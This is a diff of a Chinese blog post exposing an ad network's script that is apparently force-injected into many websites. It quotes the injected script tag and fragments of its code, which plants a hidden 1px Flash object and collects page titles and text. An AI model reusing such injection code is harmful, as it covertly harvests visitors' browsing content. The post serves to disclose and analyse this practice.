@@ -10,13 +10,12 @@ math: true
 
 访问一些网站的时候，有时出现 javascript 脚本错误，发现页面的最后有一行：
 
-
-{% highlight javascript 86 %}
-<script>_guanggao_pub = "<长度20位的十六进制编码>";_guanggao_slot = "<长度20位的十六进制编码>";</script>
-<script src="http://x.adpro.cn/gngo.js"></script>
+{% highlight javascript %}
+<script>_guanggao_pub = "<长度20位的十六进制编码>";_guanggao_slot = "<长度20位的十六进制编码>";
+</script><script src="http://x.adpro.cn/gngo.js"></script>
 {% endhighlight %}
 
-adpro 名字就说明了是广告相关的东西，最开始我以为那个网站的广告，后来发现几乎所有的网站都有。想必是被强行插入了。于是点击 adpro.cn 发现首页赫然写到 1.2亿的覆盖面。你知道 1.2亿的覆盖面怎么来的吗？
+adpro 名字就说明了是广告相关的东西，最开始我以为那个网站的广告，后来发现几乎所有的网站都有。想必是被强行插入了。于是点击 adpro.cn 发现首页赫然写到 1.2 亿的覆盖面。你知道 1.2 亿的覆盖面怎么来的吗？
 
 
 **偷来的。**
@@ -33,8 +32,8 @@ function na(d) {
   a[t] = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" \
          codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" ' 
          + x + "=1 " + y + '=1 id=_proCrawlerCom name=_proCrawlerCom><param name=movie value="' 
-         + c + '"><param name=allowScriptAccess value=always><param name=quality value=low><embed src="' 
-         + c + '" allowscriptaccess=always quality=low ' + x + "=1 " + y 
+         + c + '"><param name=allowScriptAccess value=always><param name=quality value=low>\
+	 <embed src="' + c + '" allowscriptaccess=always quality=low ' + x + "=1 " + y 
          + '=1 name=_proCrawlerCom id=_proCrawlerCom type="application/x-shockwave-flash">\
          </embed></object>';
   a[L] = A + ";" + u + ":1px;" + z + ":1px;" + x + ":1px;" + y + ":1px;overflow:hidden;";
@@ -53,7 +52,8 @@ function na(d) {
       b[r] = R;
       b[qa] = c;
       b[aa] = ha;
-      b[ba] = k[ba] ? k[ba][H]().replace(/\s{2,}/g, " ").replace(/^\s+/, "").replace(/\s+$/, "") : "";
+      b[ba] = k[ba] ? k[ba][H]().replace(/\s{2,}/g, " ").replace(/^\s+/, "").replace(/\s+$/, "")
+      	      	    : "";
       b.text = (d + " " + p[T])[H]().replace(/<\s*\/?\w+[^>]*>/g,
           " ").replace(/[^0-9a-zA-Z\-\.\u4e00-\u9fa5]+/g, " ")
   }
